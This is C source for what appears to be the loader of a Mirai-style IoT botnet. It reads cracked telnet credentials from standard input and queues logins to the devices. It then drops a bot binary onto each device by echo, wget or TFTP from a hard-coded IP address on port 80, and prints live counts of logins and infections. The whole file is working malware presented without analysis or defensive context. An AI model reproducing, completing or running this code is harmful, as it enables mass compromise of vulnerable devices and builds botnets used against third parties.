#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"

static void *stats_thread(void *);

static struct server *srv;

char *id_tag = "telnet";

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;
    addrs_len = 2;
    addrs = calloc(addrs_len, sizeof (ipv4_t));
    addrs[0] = inet_addr("185.172.110.232"); // Address to bind to
    addrs[1] = inet_addr("185.172.110.232"); // Address to bind to
    if (argc == 2)
    {
        id_tag = args[1];
    }

    if (!binary_init())
    {
        printf("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "185.172.110.232", 80, "185.172.110.232")) == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }
    pthread_create(&stats_thrd, NULL, stats_thread, NULL);
    // Read from stdin
    while (TRUE)
    {
        char strbuf[1024];

        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)
            break;

        util_trim(strbuf);

        if (strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) == NULL)
            printf("");
        else
        {
            if (srv == NULL)
                printf("srv == NULL 2\n");

            server_queue_telnet(srv, &info);
            if (total++ % 1000 == 0)
                sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    printf("Hit end of input.\n");

    while(ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);

    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while (TRUE)
    {
#ifndef DEBUG
        printf("\x1b[0;35mTime: [\x1b[1;32m%ds\x1b[0;35m] || Conns: [\x1b[1;32m%d\x1b[0;35m] || Logins: [\x1b[1;32m%d\x1b[0;35m] || Ran: [\x1b[1;32m%d\x1b[0;35m] || Echoes: [\x1b[1;32m%d\x1b[0;35m] || Wgets: [\x1b[1;32m%d\x1b[0;35m] || TFTPs: [\x1b[1;32m%d\x1b[0;37m]\n",
               seconds++, ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
#endif
        fflush(stdout);
        sleep(1);
    }
}
